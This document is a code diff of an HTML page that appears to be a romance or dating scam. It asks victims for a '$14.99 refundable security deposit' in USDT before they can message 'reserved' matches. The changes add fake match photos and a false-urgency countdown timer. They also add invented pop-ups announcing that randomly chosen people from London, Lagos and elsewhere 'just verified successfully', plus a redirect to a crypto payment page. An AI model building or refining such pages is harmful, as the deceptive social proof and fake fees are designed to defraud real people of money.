@@ -3,77 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Clearance | Secure Portal</title>
+    <title>Identity Clearance | Secure Gateway</title>
     <style>
-        body { background: #0f0f0f; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1a1a1a; padding: 40px 30px; border-radius: 30px; width: 100%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
-        .shield { width: 80px; margin-bottom: 25px; opacity: 0.9; }
-        h2 { font-size: 28px; margin-bottom: 15px; font-weight: 700; }
-        p { font-size: 14px; opacity: 0.7; line-height: 1.6; margin-bottom: 30px; }
+        body { background: #0a0a0a; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; overflow-x: hidden; }
+        .card { background: #161616; padding: 30px; border-radius: 28px; width: 100%; max-width: 380px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         
-        .timer-box { border: 1px dashed #ff4b2b; background: rgba(255, 75, 43, 0.05); padding: 20px; border-radius: 15px; margin-bottom: 25px; }
-        .timer-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #aaa; margin-bottom: 5px; display: block; }
-        #timer { color: #ff4b2b; font-size: 32px; font-weight: 800; font-family: monospace; }
+        .shield-icon { width: 50px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(74, 222, 128, 0.3)); }
+        h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 700; letter-spacing: -0.5px; }
         
-        .price-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding: 0 10px; }
-        .price-label { font-size: 16px; opacity: 0.8; }
-        .price-amount { font-size: 24px; font-weight: 700; color: #fff; }
+        /* Matches Hook */
+        .preview-box { background: rgba(255,255,255,0.03); padding: 15px; border-radius: 20px; margin-bottom: 20px; }
+        .stack { display: flex; justify-content: center; gap: -10px; margin-top: 10px; }
+        .stack img { width: 65px; height: 65px; border-radius: 50%; border: 2px solid #ff4b2b; object-fit: cover; margin: 0 5px; }
+
+        .timer-box { border: 1px dashed rgba(255, 75, 43, 0.4); background: rgba(255, 75, 43, 0.05); padding: 15px; border-radius: 16px; margin-bottom: 20px; }
+        #timer { color: #ff4b2b; font-size: 30px; font-weight: 800; font-family: monospace; }
         
-        #verifyBtn { background: #ff4b2b; color: white; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: 700; cursor: pointer; font-size: 18px; transition: all 0.3s; box-shadow: 0 10px 20px rgba(255, 75, 43, 0.2); }
-        #verifyBtn:active { transform: scale(0.98); }
-        
-        .footer-badges { margin-top: 25px; display: flex; justify-content: center; gap: 15px; font-size: 11px; opacity: 0.5; }
+        #verifyBtn { background: #ff4b2b; color: white; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: 700; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        #verifyBtn:active { transform: scale(0.97); }
+
+        /* Popup Notification */
+        #popup { 
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); 
+            background: #1f1f1f; color: #fff; padding: 12px 20px; border-radius: 50px; 
+            border: 1px solid #4ade80; display: none; font-size: 12px; z-index: 1000; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6); white-space: nowrap; 
+            animation: slideUp 0.5s ease-out;
+        }
+        @keyframes slideUp { from { bottom: -50px; opacity: 0; } to { bottom: 30px; opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://cdn-icons-png.flaticon.com/512/1067/1067344.png" class="shield" alt="Secure">
+    <img src="https://cdn-icons-png.flaticon.com/512/1067/1067344.png" class="shield-icon">
     <h2>Identity Clearance</h2>
-    <p>A temporary security hold is required to verify your profile and protect our community members from automated bots.</p>
-    
+    <p style="font-size: 13px; opacity: 0.6; margin-bottom: 20px;">Verification required to unlock private messaging with your matches.</p>
+
+    <div class="preview-box">
+        <span style="font-size: 10px; color: #4ade80; font-weight: bold; text-transform: uppercase;">Matches Reserved For You:</span>
+        <div class="stack">
+            <img src="p1.jpg">
+            <img src="p2.jpg">
+            <img src="p3.jpg">
+        </div>
+    </div>
+
     <div class="timer-box">
-        <span class="timer-label">Reserved Matches Expire In:</span>
+        <span style="font-size: 10px; opacity: 0.5; display: block; margin-bottom: 5px;">SESSION EXPIRES IN:</span>
         <div id="timer">04:40</div>
     </div>
 
-    <div class="price-row">
-        <span class="price-label">Refundable Deposit:</span>
-        <span class="price-amount">$14.99</span>
-    </div>
-
-    <button id="verifyBtn" onclick="startVerification()">Complete Verification</button>
-
-    <div class="footer-badges">
-        <span>🔒 SSL Secure</span>
-        <span>💳 PCI Compliant</span>
-    </div>
+    <button id="verifyBtn" onclick="startVerification()">Pay Clearance Fee ($14.99)</button>
+    <p style="font-size: 10px; opacity: 0.4; margin-top: 15px;">Refundable security deposit via USDT Gateway.</p>
 </div>
 
+<div id="popup">✅ <span id="popup-text"></span></div>
+
 <script>
-    // Timer Logic
+    // 1. Timer Logic
     let time = 280;
-    const timerElement = document.getElementById('timer');
     setInterval(() => {
         let mins = Math.floor(time / 60);
         let secs = time % 60;
-        timerElement.innerHTML = `0${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        document.getElementById('timer').innerHTML = `0${mins}:${secs < 10 ? '0' : ''}${secs}`;
         if(time > 0) time--;
     }, 1000);
 
-    // Redirect Logic
+    // 2. LIVE NOTIFICATIONS (The missing piece)
+    const names = ["Marcus", "Tunde", "David", "Jason", "Robert", "Chris"];
+    const locations = ["London", "Abuja", "Manchester", "Lagos", "New York"];
+
+    function showPopup() {
+        const name = names[Math.floor(Math.random() * names.length)];
+        const loc = locations[Math.floor(Math.random() * locations.length)];
+        const popup = document.getElementById('popup');
+        
+        document.getElementById('popup-text').innerHTML = `<b>${name}</b> from ${loc} just verified successfully.`;
+        
+        popup.style.display = 'block';
+        setTimeout(() => { popup.style.display = 'none'; }, 4000);
+    }
+
+    // Start notifications after 3 seconds, repeat every 15 seconds
+    setTimeout(showPopup, 3000);
+    setInterval(showPopup, 18000);
+
+    // 3. Redirect to Crypto Page
     function startVerification() {
         const btn = document.getElementById('verifyBtn');
-        btn.innerHTML = "Syncing Secure Gateway...";
+        btn.innerHTML = "Opening Secure Gateway...";
         btn.style.background = "#333";
         btn.disabled = true;
-
-        setTimeout(() => {
-            btn.innerHTML = "Finalizing Handshake...";
-            setTimeout(() => {
-                window.location.href = "crypto_pay.html";
-            }, 1500);
-        }, 2000);
+        setTimeout(() => { window.location.href = "crypto_pay.html"; }, 2000);
     }
 </script>
 
